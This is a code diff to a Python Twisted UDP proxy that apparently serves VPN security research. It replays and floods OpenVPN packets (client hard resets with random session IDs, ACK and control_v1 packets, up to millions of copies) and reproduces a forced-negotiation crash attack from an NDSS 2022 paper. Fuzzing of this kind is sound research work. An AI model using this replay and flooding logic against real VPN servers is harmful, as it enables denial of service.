@@ -11,24 +11,26 @@ import argparse
 # source site: https://distrustsimplicity.net/articles/a-simple-udp-forwarder-in-twisted/
 
 # should first fill in the client_ip, server_ip, replay_select
-
 # "192.168.1.33"
 # now we use the same IP as it's in docker
-global client_ip
 client_ip = "172.17.0.3"
 # "192.168.1.155"
-global server_ip
 server_ip = "172.17.0.3"
 
-global replay_select
-# this serves for active learning part 
-global allowed_control_v1_num
-global control_v1_num
+# "openvpn" or "wireguard"
+test_type = "openvpn"
+# 50000 for openvpn and 60000 for wireguard
+binding_port = 50000
+client_port = 40000
+# 1194 for openvpn, 60683 for wireguard for now
+server_port = 1194
 
 # "control_v1" "client_restart_v2" "ack_c" "ack_s"
 # "ndss_restart" means the forced negotiation crash attack in the ndss 2022 paper
 replay_select = "ack_c"
 num_replay = 10000000
+
+# this serves for active learning part 
 # when the client is the Mac software, it will send one extra last messagem so in total 10, we increase it from 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
 # while when the client is built from the source implementation, the client won't send the last message and only 9 in total.
 allowed_control_v1_num = 200000
@@ -41,22 +43,8 @@ resume_control_v1_num = 20
 # with 8th, client will get key material from server, but still needs options from 9th message to generate data channel keys successfully
 # only with 9th from server, then the client will generate data channel keys
 # but the server will send data channel messages even before the client confirms receiving the 9th control message
-
 control_v1_num = 0
-# "openvpn" or "wireguard"
-test_type = "openvpn"
-# 50000 for openvpn and 60000 for wireguard
-binding_port = 50000
 
-
-global client_port 
-client_port = 40000
-global server_port 
-# 1194 for openvpn, 60683 for wireguard for now
-server_port = 1194
-
-global saved_pkt
-global sent_saved_pkt 
 sent_saved_pkt = False
 
 P_CONTROL_HARD_RESET_CLIENT_V2 = 7
@@ -104,9 +92,11 @@ class Forward(DatagramProtocol):
         global saved_pkt
         global sent_saved_pkt
 
- 
+        global num_replay
+
         global allowed_control_v1_num
         global control_v1_num
+        global resume_control_v1_num
 
 
         if test_type == "openvpn":
@@ -155,7 +145,7 @@ class Forward(DatagramProtocol):
                 # if it's not a control_v1 packet, send casually
                 if type_opcode!= 0x04:
                     if type_opcode==0x05: # ACK
-                        openvpn_packet.show()
+                        # openvpn_packet.show()
                         print("**************** we got an ACK packet  *****************")
                        # openvpn_packet.Session_ID = 4669467424213927853    
                         openvpn_packet.show()
@@ -187,14 +177,14 @@ class Forward(DatagramProtocol):
 
                 # if the pkt is Client_hard_reset_v2, we generate 100 such pkts to see the effects
                 if type_opcode == 0x07 and args.fuzzway == "replay" and args.pkt == "client_restart_v2":
-                    print("we got the initial pkt from client")
+                    print("we got the initial pkt from client, will start sending 100 copies of it")
                     for i in range(100):
                         new_pkt = openvpn_packet
                         # create a new random 8 byte client session ID in the type of int
                         # print("SHOULD DEBUG SETTING THE NEW RANDOM SESSION ID.....")
                         new_pkt.Session_ID = int.from_bytes(secrets.token_bytes(8), byteorder='big')
                         self.transport.write(bytes(new_pkt), (server_ip, 1194))
-                        print("sent a new packet with randomly-created client session_id to server: 1194")
+                        # print("sent a new packet with randomly-created client session_id to server: 1194")
 
                 if type_opcode == 0x05 and args.fuzzway == "replay" and args.pkt == "ack_c":
                     print("we got an ack packet from client")
@@ -209,13 +199,18 @@ class Forward(DatagramProtocol):
                         self.transport.write(bytes_new_pkt, (server_ip, 1194))
                         total_bytes_sent += len_bytes_new_pkt
                         # print("sent a copy of ack packet to server")
-                
-                    end_time = time.time() 
-                    total_time = end_time - start_time
-                    if total_time > 0:  
-                        bytes_per_second = total_bytes_sent / total_time  
-                        print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
-                        print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
+                        
+                        if i==1000:
+                            print("we measure the sending rate when 1000 packets are sent")
+                            end_time = time.time() 
+                            total_time = end_time - start_time
+                            if total_time > 0:  
+                                bytes_per_second = total_bytes_sent / total_time  
+                                print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
+                                print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
+
+                        
+                   
                                  
 
                 if type_opcode == 0x04 and args.fuzzway == "replay" and args.pkt == "control_v1":
@@ -231,15 +226,18 @@ class Forward(DatagramProtocol):
                         # simply replay the p_control_v1 pkt since it won't be checked with rate limit
                         self.transport.write(bytes_new_pkt, (server_ip, 1194))
                         total_bytes_sent += len_bytes_new_pkt
-                
-                    end_time = time.time() 
-                    total_time = end_time - start_time
-                    if total_time > 0:  
-                        bytes_per_second = total_bytes_sent / total_time  
-                        print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
-                        print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
-                       
+                        
+                        if i==1000:
+                            print("we measure the sending rate when 1000 packets are sent")
+                            end_time = time.time() 
+                            total_time = end_time - start_time
+                            if total_time > 0:  
+                                bytes_per_second = total_bytes_sent / total_time  
+                                print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
+                                print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
 
+                
+                   
                 # try the ndss cve, i.e., sending a single restart to server during normal connection
                 if type_opcode == 0x07 and args.fuzzway == "replay" and args.pkt == "ndss_restart":
                     saved_pkt = openvpn_packet # after the tunnel is made, send it to trigger the cve
@@ -263,7 +261,7 @@ class Forward(DatagramProtocol):
                 if type_opcode!= 0x04:
                     if type_opcode==0x05: # ACK
                         print("**************** we got an ACK packet *****************")
-                        openvpn_packet.show()
+                        # openvpn_packet.show()
 
                     self.transport.write(bytes_opacket, (client_ip, client_port))
                     # print(f"the proxy sent {bytes_opacket!r} to client:", client_port)
@@ -304,9 +302,6 @@ def main():
     parser.add_argument("--resume_control_v1_num", type=int, help="the threshold of control_v1 pkt num to resume sending", default=20000)
 
     global args 
-    global allowed_control_v1_num
-    global num_replay
-    global resume_control_v1_num
     args = parser.parse_args()
     num_replay = args.num_replay
     allowed_control_v1_num = args.allowed_control_v1_num
